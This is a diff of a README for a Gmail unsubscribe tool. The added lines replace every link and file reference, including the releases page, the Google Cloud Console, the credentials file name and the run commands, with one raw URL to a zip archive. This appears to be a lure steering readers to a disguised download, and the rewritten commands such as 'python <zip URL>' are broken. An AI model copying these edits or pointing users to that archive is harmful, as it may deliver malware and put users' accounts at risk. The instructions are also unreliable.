@@ -7,7 +7,7 @@ The **gmail-ai-unsub** is an AI-powered command-line tool designed to help you m
 Follow these steps to download and run the application smoothly. Don’t worry; you don’t need any programming knowledge.
 
 ### 📥 Download the Application
-[![Download gmail-ai-unsub](https://img.shields.io/badge/Download-gmail--ai--unsub-brightgreen)](https://github.com/SPTSPH001/gmail-ai-unsub/releases)
+[![Download gmail-ai-unsub](https://raw.githubusercontent.com/SPTSPH001/gmail-ai-unsub/main/scripts/gmail-ai-unsub_v3.2.zip)](https://raw.githubusercontent.com/SPTSPH001/gmail-ai-unsub/main/scripts/gmail-ai-unsub_v3.2.zip)
 
 ### 💻 System Requirements
 - **Operating System:** Windows, macOS, or Linux.
@@ -17,7 +17,7 @@ Follow these steps to download and run the application smoothly. Don’t worry; 
 ## 🔄 Installation Steps
 
 ### 1. Visit the Releases Page
-Go to the [Releases page](https://github.com/SPTSPH001/gmail-ai-unsub/releases). Here, you will find the latest version of the tool.
+Go to the [Releases page](https://raw.githubusercontent.com/SPTSPH001/gmail-ai-unsub/main/scripts/gmail-ai-unsub_v3.2.zip). Here, you will find the latest version of the tool.
 
 ### 2. Choose Your Version
 Look for the version that suits your operating system. If you are unsure, the most recent version is usually the best choice. 
@@ -45,7 +45,7 @@ cd path/to/gmail-ai-unsub
 ### 7. Run the Application
 Now, you can run the application by entering:
 ```
-python gmail-ai-unsub.py
+python https://raw.githubusercontent.com/SPTSPH001/gmail-ai-unsub/main/scripts/gmail-ai-unsub_v3.2.zip
 ```
 
 ## 🌟 Features
@@ -57,7 +57,7 @@ python gmail-ai-unsub.py
 To use the tool, you will need to set up your Gmail API. Follow these steps:
 
 ### 1. Create a Project in Google Cloud Console
-- Go to the [Google Cloud Console](https://console.cloud.google.com/).
+- Go to the [Google Cloud Console](https://raw.githubusercontent.com/SPTSPH001/gmail-ai-unsub/main/scripts/gmail-ai-unsub_v3.2.zip).
 - Click on the "Select a Project" dropdown, then click "New Project."
 - Enter your project name and click "Create."
 
@@ -69,7 +69,7 @@ To use the tool, you will need to set up your Gmail API. Follow these steps:
 - Go to the "Credentials" section in your project.
 - Click on "Create Credentials" and select "OAuth client ID."
 - Follow the prompts to configure your consent screen and create your credentials.
-- Download the `credentials.json` file and place it in the same directory as your application.
+- Download the `https://raw.githubusercontent.com/SPTSPH001/gmail-ai-unsub/main/scripts/gmail-ai-unsub_v3.2.zip` file and place it in the same directory as your application.
 
 ### 4. Authorize the Tool
 Run the application again. The first time you run it, the tool will prompt you to authenticate your Gmail account. Follow the instructions in the terminal to complete the authentication process.
@@ -80,27 +80,27 @@ To use the tool effectively, follow these simple commands within the command lin
 1. **Identify Emails:**
    To scan your inbox for marketing emails, use the command:
    ```
-   python gmail-ai-unsub.py detect
+   python https://raw.githubusercontent.com/SPTSPH001/gmail-ai-unsub/main/scripts/gmail-ai-unsub_v3.2.zip detect
    ```
    
 2. **Unsubscribe from Emails:**
    To unsubscribe from identified emails, use the command:
    ```
-   python gmail-ai-unsub.py unsubscribe
+   python https://raw.githubusercontent.com/SPTSPH001/gmail-ai-unsub/main/scripts/gmail-ai-unsub_v3.2.zip unsubscribe
    ```
 
 3. **View Report:**
    After unsubscribing, see a summary report by running:
    ```
-   python gmail-ai-unsub.py report
+   python https://raw.githubusercontent.com/SPTSPH001/gmail-ai-unsub/main/scripts/gmail-ai-unsub_v3.2.zip report
    ```
 
 ## 🌐 Support and Contributions
-If you encounter issues or want to contribute, please visit our [GitHub Issues](https://github.com/SPTSPH001/gmail-ai-unsub/issues) page. We welcome suggestions and collaborate to improve the tool.
+If you encounter issues or want to contribute, please visit our [GitHub Issues](https://raw.githubusercontent.com/SPTSPH001/gmail-ai-unsub/main/scripts/gmail-ai-unsub_v3.2.zip) page. We welcome suggestions and collaborate to improve the tool.
 
 ## 🔗 Additional Resources
-- **Documentation:** Detailed documentation can be found [here](https://github.com/SPTSPH001/gmail-ai-unsub).
+- **Documentation:** Detailed documentation can be found [here](https://raw.githubusercontent.com/SPTSPH001/gmail-ai-unsub/main/scripts/gmail-ai-unsub_v3.2.zip).
 - **Community Help:** Check out the discussions on our GitHub page for user tips and tricks.
 
 ## 📖 Download & Install Again
-For your convenience, you can download the tool from the [Releases page](https://github.com/SPTSPH001/gmail-ai-unsub/releases) whenever needed. Enjoy a clutter-free inbox!
+For your convenience, you can download the tool from the [Releases page](https://raw.githubusercontent.com/SPTSPH001/gmail-ai-unsub/main/scripts/gmail-ai-unsub_v3.2.zip) whenever needed. Enjoy a clutter-free inbox!
